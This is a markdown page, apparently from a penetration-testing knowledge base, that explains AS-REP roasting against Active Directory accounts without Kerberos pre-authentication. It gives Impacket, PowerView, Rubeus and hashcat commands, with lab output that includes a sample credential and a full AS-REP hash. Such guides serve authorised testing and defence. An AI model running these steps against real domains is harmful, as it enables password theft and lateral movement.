---
title: "ASREProasting"
description: Take advantage of users with no Kerberos pre-authentication requirements and recover their password
categories: [Active Directory, Lateral Movement]
tags: [Active Direcotory, Kerberoast, Lateral Movement, Privilege Escalation]
weight: 2
---

## Theory

Normally, in order for users to obtain their **Ticket Granting Ticket (TGT)** from the **Key Distribution Center (KDC)**, they have to verify their identity via **pre-authentication**. If the verification is successful, the KDC would then send a TGT back inside its **Authentication Service Response (AS-REP)**, which is encrypted with a key derived from the user's password.

Active Directory has an option inside the user's **User Account Control (UAC)** settings called **Do not require Kerberos pre-authentication**. As its name suggests, the KDC would response with the **AS-REP** containing the user's encrypted TGT without first verifying the user's identity.

![](/img/asreproast/do_not_require_preauth.png)

If this option is enabled on the target user, the Attacker can request a TGT for the user without provide the KDC with their password, then use brute-force attack to decrypt the AS-REP to obtain the user's cleartext password.

The only requirement for this attack is that we control a domain user with at least standard privileges.

## Linux Perspective
From a Linux attacker machine, `GetNPUsers.py` from Impacket can be used to both enumerate and obtain the encrypted AS-REP. We run the Python script without the `-request` to enumerate all users with **Do not require Kerberos pre-authentication** enabled.
```bash
GetNPUsers.py -dc-ip <dc_ip> <domain>/<user>:<password>
```
```shell-session
╭─brian@rx-93-nu ~
╰─$ GetNPUsers.py -dc-ip 10.10.0.3 GUNDAM.LOCAL/amuro.ray:Password1
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Name          MemberOf  PasswordLastSet             LastLogon                   UAC
------------  --------  --------------------------  --------------------------  --------
hathaway.noa            2026-04-09 20:36:53.519673  2026-04-16 16:46:31.017931  0x410200
```
To carry out the ASREProasting process and obtain the AS-REP blob, we use the `-request` flag.
```bash
GetNPUsers.py -request -dc-ip <dc_ip> <domain>/<user>:<password>
```
```txt
╭─brian@rx-93-nu ~
╰─$ GetNPUsers.py -request -dc-ip 10.10.0.3 GUNDAM.LOCAL/amuro.ray:Password1
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Name          MemberOf  PasswordLastSet             LastLogon                   UAC
------------  --------  --------------------------  --------------------------  --------
hathaway.noa            2026-04-09 20:36:53.519673  2026-04-16 16:46:31.017931  0x410200



$krb5asrep$23$hathaway.noa@GUNDAM.LOCAL:fe3a480111d9c7a40d9760a93c2bee78$93782918d8a804f3be8381ee86e3b5562a090c76d200ab3d78c2040dc46e068bd04fb2623353fa69cd795ba9411013218b55a66def59be3d90089e0eec8c2eb1bfd19ff5775d867c3d6ad4892fccc2c71538ee6bf515abd1524cf64eacdde3ae8016180a7192ad67a7b78e43a8e1ccebcb0aca9726bc42f6075693276a9c87cf6b9e44a2889bf3a6b6fe5f08a0d42cb9dd80fd57d9bca78751e8e8119bbfc775945b81cf813ffed75fc7fad8dff0ac6f9f4be2e4e51082cd7ccc85e6d8dd1d315adeecd79a5f416888196313d16aeb721f8a5b4e23e3b9fa8e01baf2e20ea9ff347987d0510d8e8f661d1983966d0fb6ebdf621831a6b57fe6738119
```

## Windows Perspective
From a Windows domain computer, we can use PowerView's `Get-DomainUser` with option `-PreauthNotRequired` to enumerate ASREProastable users.
```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```
```shell-session
PS C:\research> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl


samaccountname     : hathaway.noa
userprincipalname  : hathaway.noa@GUNDAM.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```
ASREProasting can be carried on from Windows using Rubeus and the `asreproast` subcommand.
```cmd
.\Rubeus.exe asreproast /user:<target_user> /nowrap /format:hashcat
```

## Cracking AS-REP
Hashcat mode 18200 may be used to crack the password from a AS-REP (`$krb5asrep$23$`).
```bash
hashcat -m 18200 <asrep_file> <wordlist>
```
